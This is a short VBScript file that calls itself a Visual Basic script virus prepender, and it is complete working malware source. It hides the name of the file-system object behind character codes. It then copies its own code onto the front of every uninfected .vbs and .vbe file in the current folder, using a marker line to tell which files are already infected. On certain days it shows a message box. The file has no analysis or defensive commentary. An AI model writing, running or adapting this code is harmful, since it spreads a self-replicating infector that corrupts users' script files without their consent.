'FVBSVP
Set FSO = CreateObject(Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(105) & Chr(110) & Chr(103) & "." & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(83) & Chr(121) & Chr(115) & Chr(116) & Chr(101) & Chr(109) & Chr(79) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116))
Set OpenSelf = FSO.OpenTextFile(Wscript.ScriptFullName, 1)
Self = OpenSelf.Readall
Set CurrentDirectory = FSO.GetFolder(".").Files
For Each ScriptFiles in CurrentDirectory
  ExtName = FSO.GetExtensionName(ScriptFiles.path)
  If ExtName = "vbs" or ExtName = "vbe" then
    Set ReadScripts = FSO.OpenTextFile(ScriptFiles.path, 1)
    If ReadScripts.ReadLine <> "'FVBSVP" then
      Set ReadScripts = Nothing
      Set ReadScripts = FSO.OpenTextFile(ScriptFiles.path, 1) 
      ScriptsSource = ReadScripts.Readall
      Set WriteToScripts = FSO.OpenTextFile(ScriptFiles.path, 2)
      WriteToScripts.WriteLine Self
      WriteToScripts.WriteLine ScriptsSource
      WriteToScripts.Close
    End If
  End If
Next
If Day(Now) = 14 or Day(Now) = 20 then
  MsgBox "THE FIRST VISUAL BASIC SCRIPT VIRUS PREPENDER !", 0, "FIRST VBS VIRUS PREPENDER"
End If

  








        
